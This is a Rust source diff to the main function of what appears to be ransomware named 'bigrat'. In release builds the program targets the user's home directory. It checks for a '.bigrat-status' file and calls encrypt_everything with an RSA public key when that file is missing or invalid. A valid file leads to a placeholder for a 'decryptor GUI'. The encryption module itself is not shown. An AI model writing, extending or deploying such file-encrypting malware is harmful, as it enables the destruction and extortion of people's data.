@@ -1,9 +1,12 @@
 mod encryptor;
 mod decryptor;
 
+use std::fs;
 use rsa::pkcs8::DecodePublicKey;
 use rsa::RsaPublicKey;
 use anyhow::Result;
+use ::decryptor::helpers::gen_new_path;
+use crate::decryptor::{get_status_data, StatusReadError};
 use crate::encryptor::encrypt_everything;
 
 const BIGRAT_PNG: &[u8; 1044942] = include_bytes!("../../bigrat.png");
@@ -20,7 +23,29 @@ fn main() -> Result<()> {
     #[cfg(not(debug_assertions))]
     let working_path = dirs_next::home_dir().unwrap();
 
-    encrypt_everything(&working_path, &pub_key, &mut rng)?;
+    match get_status_data(&working_path) {
+        Ok(data) => {
+            dbg!(data);
+            todo!("Start decryptor GUI")
+        }
+        Err(err) => {
+            match err {
+                StatusReadError::IoError(e) => Err(e)?,
+                StatusReadError::DoesNotExist => {
+                    encrypt_everything(&working_path, &pub_key, &mut rng)?;
+                }
+                StatusReadError::Invalid(err_text) => {
+                    eprintln!("Invalid status file: {}", err_text);
+                    let status_path = working_path.join(".bigrat-status");
+                    fs::rename(
+                        &status_path,
+                        gen_new_path(status_path.clone(), true)?
+                    )?;
+                    encrypt_everything(&working_path, &pub_key, &mut rng)?;
+                }
+            }
+        }
+    }
 
     Ok(())
 }
